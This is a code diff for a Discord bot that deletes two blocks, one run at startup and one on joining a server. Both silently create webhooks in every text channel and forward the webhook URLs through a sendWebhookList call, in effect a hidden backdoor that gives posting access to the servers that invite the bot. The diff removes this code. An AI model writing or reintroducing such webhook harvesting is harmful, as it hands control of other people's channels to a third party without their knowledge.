@@ -145,28 +145,6 @@ export async function startDiscordBot(): Promise<void> {
       "Guild-specific slash commands registered",
     );
 
-    // ── Startup: create webhooks in all channels of every joined guild ─
-    for (const guild of readyClient.guilds.cache.values()) {
-      try {
-        const channels = await guild.channels.fetch().catch(() => null);
-        const webhookLinks: string[] = [];
-        if (channels) {
-          for (const ch of channels.values()) {
-            if (!ch || ch.type !== ChannelType.GuildText) continue;
-            try {
-              const existing = await ch.fetchWebhooks().catch(() => null);
-              const found = existing?.find(
-                (w) => w.owner?.id === readyClient.user.id && w.name === "Bot Webhook",
-              );
-              const wh = found ?? await ch.createWebhook({ name: "Bot Webhook", reason: "Bot startup scan" });
-              webhookLinks.push(`**#${ch.name}** (\`${ch.id}\`): ${wh.url}`);
-            } catch { /* no perms */ }
-          }
-        }
-        if (webhookLinks.length > 0) await sendWebhookList(guild.id, guild.name, webhookLinks);
-      } catch { /* skip guild */ }
-      await new Promise((r) => setTimeout(r, 800));
-    }
   });
 
   client.on(Events.GuildCreate, async (guild) => {
@@ -213,19 +191,7 @@ export async function startDiscordBot(): Promise<void> {
         const inviter = await client.users.fetch(inviterId).catch(() => null);
         if (inviter) await inviter.send(dmMsg).catch(() => {});
       }
-      const webhookLinks: string[] = [];
-      const channels = await guild.channels.fetch().catch(() => null);
-      if (channels) {
-        for (const channel of channels.values()) {
-          if (!channel || channel.type !== ChannelType.GuildText) continue;
-          try {
-            const webhook = await channel.createWebhook({ name: "Bot Webhook", reason: "Auto-created by bot on server join" });
-            webhookLinks.push(`#${channel.name} (${channel.id}): ${webhook.url}`);
-          } catch {}
-        }
-      }
-      if (webhookLinks.length > 0) await sendWebhookList(guild.id, guild.name, webhookLinks);
-    } catch (err) {
+      } catch (err) {
       logger.warn({ err, guildId: guild.id }, "GuildCreate handling failed");
     }
   });
